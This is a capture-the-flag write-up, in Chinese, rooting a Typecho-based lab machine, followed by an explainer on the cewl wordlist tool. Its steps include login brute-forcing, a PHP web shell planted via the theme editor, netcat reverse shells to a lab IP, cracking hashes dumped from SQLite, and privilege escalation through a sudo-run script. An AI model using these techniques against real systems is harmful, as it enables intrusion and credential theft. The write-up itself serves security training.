---
title: Type
date: 2026-05-03
categories:
  - 靶机
  - QQGroup
---


```bash
 cewl http://type.dsz > pass.txt
 cat pass.txt
 cat pass.txt|grep '^[A-Z]' > pass2.txt
```

![](assets/Pasted%20image%2020260227093556.png)
![](assets/Pasted%20image%2020260227093628.png)

http://type.dsz/index.php/author/1/
用户名
```
admin
sburro
plugugly
```
![](assets/Pasted%20image%2020260227093800.png)
![](assets/Pasted%20image%2020260227093824.png)
![](assets/Pasted%20image%2020260227093842.png)
- payload1
![](assets/Pasted%20image%2020260227094215.png)

- payload2
![](assets/Pasted%20image%2020260227094149.png)
- burp爆破发现用户密码
	name=sburro
	password=DevNotes
![](assets/Pasted%20image%2020260227094402.png)
## 登录
![](assets/Pasted%20image%2020260227094555.png)
发现管理标题 有串密钥，推测是管理员密码 `2DbYCYpXwvV9kKwO`

###  写入木马

- 控制台-外观
```php
<?php exec($_GET[0]);?>
```
![](assets/Pasted%20image%2020260227095102.png)

```http
http://type.dsz/?0= busybox nc 192.168.43.16 -e /bin/sh
```
https://www.doubao.com/thread/w22e6a59aec28a8a7
![](assets/Pasted%20image%2020260227095743.png)
由于只有sh解释器，这里稳定脚本语句如下：
```bash
python3 -c "import pty;pty.spawn('/bin/sh');"
Ctrl+Z #手动按键盘
stty raw -echo; fg 
reset
stty rows 29 columns 112
export TERM=xterm 
```

## 进入shell分析
- 发现user.txt，还有个.hint提示 
```bash
/home/plugugly $ ls -la
total 16
drwxr-sr-x    2 plugugly plugugly      4096 Feb 23 10:43 .
drwxr-xr-x    3 root     root          4096 Feb 22 23:25 ..
lrwxrwxrwx    1 root     plugugly         9 Feb 23 10:43 .ash_history -> /dev/null
-rw-r--r--    1 root     plugugly       111 Feb 23 10:42 .hint
-rw-r--r--    1 root     plugugly        44 Feb 22 23:25 user.txt
/home/plugugly $ cat user.txt 
flag{user-f1315ee82308853cc1a9402f2cfa6d1c}
/home/plugugly $ cat .hint 
Can't type fast enough? Maybe the system stat bar has a hidden 'Debug Mode'. Try to knock on it several times.
```

发现有database, 是SQLite
```bash
/data $ ls -la
total 20
drwxr-xr-x    5 root     root          4096 Feb 22 23:19 .
drwxr-xr-x   22 root     root          4096 Feb 23 10:56 ..
drwxr-xr-x    2 root     root          4096 Feb 22 23:19 certs
drwxrwxrwx    2 root     root          4096 Feb 27 09:57 database
drwxrwxrwx    6 root     root          4096 Feb 23 00:00 typecho
/data $ cd database/
/data/database $ ls
typecho.db
/data/database $ ls -la
total 112
drwxrwxrwx    2 root     root          4096 Feb 27 09:57 .
drwxr-xr-x    5 root     root          4096 Feb 22 23:19 ..
-rw-r--r--    1 nobody   nobody      102400 Feb 27 09:57 typecho.db
/data/database $ file typecho.db 
typecho.db: SQLite 3.x database, last written using SQLite version 3049002, file counter 382, database pages 25, cookie 0x13, schema 4, UTF-8, version-valid-for 382
```

访问sqlite
```bash
/data/database $ sqlite3 typecho.db 
SQLite version 3.49.2 2025-05-07 10:39:52
Enter ".help" for usage hints.
sqlite> .tables
typecho_comments       typecho_metas          typecho_users        
typecho_contents       typecho_options      
typecho_fields         typecho_relationships
sqlite> select * from typecho_users
   ...> ;
1|admin|$P$B/xZAkZ342fLS1sEQwQfsXTVKiBnVG/|admin@type.dsz|http://type.dsz/|admin|1771773701|1772157442|1771815254|administrator|6f9308b9c68ffc22516422bd5b9a32e3
2|sburro|$P$BfS2sY4Vz6sHjC52095jVAFOjMNyuy1|sburro@type.dsz||sburro|1771774529|1772156834|1771775693|contributor|ae834465efedeb9b6a3b333f321452e2
3|plugugly|$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U/|plugugly@type.dsz||plugugly|1771812079|0|0|subscriber|
sqlite> 
```

因为home下有plugugly用户，所以关注这个用户的hash
```
/data/database $ cd /home
/home $ ls 
plugugly
```

破解hash
```bash
☁  type  echo '$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U/' > hash
☁  type  cat hash                    
$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U/
☁  type  john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
2boobies         (?)     
1g 0:00:00:03 DONE (2026-02-27 10:49) 0.3289g/s 32463p/s 32463c/s 32463C/s Dominic1..221180
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
☁  type  john --show hash                                     
?:2boobies

1 password hash cracked, 0 left
```

`ssh的用户密码 plugugly  2boobies`

## ssh
```bash
Type:~$ sudo -l
Matching Defaults entries for plugugly on Type:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XAUTHORITY

Runas and Command-specific defaults for plugugly:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User plugugly may run the following commands on Type:
    (ALL) NOPASSWD: /root/typer.py
```

```
export XAUTHORITY=/home/plugugly/.Xauthority
sudo /root/typer.py
```

![](assets/Pasted%20image%2020260227112558.png)

给cleanup_scores.sh加上反弹shell
```
Type:/usr/local/bin$ ls
cleanup_scores.sh
Type:/usr/local/bin$ cat cleanup_scores.sh 
#!/bin/sh
busybox nc 192.168.43.16 1111 -e /bin/sh
echo 'Cleanup process started by root...'
```


```bash
☁  ~  nc -lvnp 1111
listening on [any] 1111 ...
id
connect to [192.168.43.16] from (UNKNOWN) [192.168.43.196] 41601
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
cd /usr
ls
linpeas.sh
user.txt
cd /root
ls
root.txt
typer.py
cat root.txt
flag{root-e0d46f8ca8c65edb6b7d46daeafebe16}
```
# CEWL：CTF 中必备的密码字典生成工具

**CEWL（发音为"cool"）是Custom Word List generator（自定义单词列表生成器）的缩写**，是一款在CTF（Capture The Flag）夺旗赛中广泛使用的密码字典生成工具，默认集成于Kali Linux等渗透测试系统中。

---

### 核心功能与原理

CEWL本质是一个网络爬虫，它通过以下方式生成定制化密码字典：

1. 爬行指定URL到设定深度，提取网站内容中的单词
    
2. 可选择跟随外部链接，扩大爬取范围
    
3. 收集页面中mailto链接里的电子邮件地址（可用作用户名）
    
4. 生成仅包含目标网站特有词汇的字典，而非通用字典
    

### CTF中的典型应用场景

在CTF比赛中，CEWL主要用于：

- **Web登录爆破**：生成目标网站专属字典，配合Hydra、ffuf等工具破解登录密码
    
- **密码破解辅助**：为John the Ripper、Hashcat等工具提供针对性字典
    
- **社会工程学攻击**：提取网站中的品牌名、产品名、员工姓名等信息，构建社工字典
    
- **特定系统渗透**：针对靶机网站生成符合其内容特点的密码字典，提高爆破成功率
    

### 基础使用示例

```Bash
# 基础用法：爬取目标网站深度为3，生成字典
cewl -d 3 -w custom_wordlist.txt https://target-website.com

# 收集电子邮件地址
cewl -e -w emails.txt https://target-website.com

# 设置最小单词长度（如5个字符）
cewl -m 5 -w long_words.txt https://target-website.com
```

### 为什么在CTF中重要

CTF题目中的密码往往与目标系统/网站内容相关，使用通用字典（如rockyou.txt）可能效率低下，而CEWL生成的**目标专属字典**能显著提高密码破解成功率，是渗透测试人员必备工具之一。
